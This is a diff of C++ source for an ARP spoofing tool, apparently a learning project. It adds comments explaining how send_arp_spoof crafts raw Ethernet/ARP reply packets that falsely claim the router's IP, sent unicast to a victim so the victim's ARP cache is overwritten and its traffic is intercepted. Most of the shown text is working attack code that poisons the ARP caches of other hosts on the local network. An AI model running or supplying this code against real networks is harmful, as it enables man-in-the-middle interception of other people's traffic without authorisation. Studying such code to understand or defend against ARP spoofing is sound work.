@@ -81,9 +81,22 @@ std::string ARP::get_default_gateway(const char* iface) {
     return "";
 }
 
+/*
+    The Goal: Convince the Victim that We are the Router. 
+    The Challenge: We must build a packet from scratch (Byte by Byte) 
+    because the OS won't let us lie about our IP address using standard sockets.
+*/
+
 // Function to send an ARP spoofing packet
 void ARP::send_arp_spoof(const char* iface, const char* target_ip, const char* spoof_ip, const char* target_mac_str) {
     // 1. Create Socket
+    /*
+        AF_PACKET: AF_INET starts at layer 3 (IP), AF_PACKET puts us at layer 2, thus letting us modify ARP structures.
+        SOCK_RAW: Tell the OS to not touch our packets, so we'll format them manually.
+        htons(ETH_P_ARP): Tell the kernel we will be working with ARP packets.
+        htons - host to network short, intel cpus store numbers in little-endian format, network
+        protocols expect big-endian format, this flips the bytes so network understands the number 2054 (0x0806 ARP ID)
+    */
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (sock < 0) {
         perror("Socket creation failed");
@@ -100,17 +113,20 @@ void ARP::send_arp_spoof(const char* iface, const char* target_ip, const char* s
 
     // 4. Prepare Packet
     uint8_t packet[60]; 
-    memset(packet, 0, 60); 
+    memset(packet, 0, 60); // Set 60 bytes to 0 (to avoid garbage data)
 
+    // Physical Envelope (14 bytes) + ARP Letter (28 bytes)
     struct ethhdr* eth = (struct ethhdr*)packet;
+    
+    // ARP Header starts after Ethernet Header
     struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ethhdr));
 
     // --- ETHERNET HEADER (The "Envelope") ---
-    // DESTINATION: Victim MAC (Unicast)
-    // This is the "Stealth" part. We whisper to the victim, bypassing switch security.
+    // h_dest: Destination MAC (Victim), instead of a broadcast
+    // We use unicast to send private message and avoid the switch's filter
     memcpy(eth->h_dest, victim_mac, 6);   
     
-    // SOURCE: Us
+    // h_proto: tell the receiving card that this is an ARP packet (not ipv4 or ipv6)
     memcpy(eth->h_source, attacker_mac, 6);
     eth->h_proto = htons(ETH_P_ARP);
 
@@ -120,16 +136,16 @@ void ARP::send_arp_spoof(const char* iface, const char* target_ip, const char* s
     arp->hlen = 6;
     arp->plen = 4;
     
-    // CHANGE 1: Opcode is 2 (Reply). 
-    // "arpspoof" uses Reply because it forces an overwrite. 
-    // Requests (Opcode 1) are polite but often ignored by hardened kernels.
+    // The Opcode: 1 for Request, 2 for Reply
+    // We chose 2: windows/linux cache logic says "If I got a reply, I must update my ARP table"
+    // Simply sending Requests may be ignored.
     arp->oper = htons(2);       
 
-    // SENDER: Us (claiming to be Router)
-    memcpy(arp->sha, attacker_mac, 6);       
+    // sha: sender hardware address, our MAC
+    memcpy(arp->sha, attacker_mac, 6);      
+    // spa: sender protocol address, the IP we are spoofing (the Router's IP) 
     inet_pton(AF_INET, spoof_ip, arp->spa);  
 
-    // CHANGE 2: Target is Victim
     // In a Reply packet, we must specify exactly who we are talking to.
     memcpy(arp->tha, victim_mac, 6);         
     inet_pton(AF_INET, target_ip, arp->tpa); 
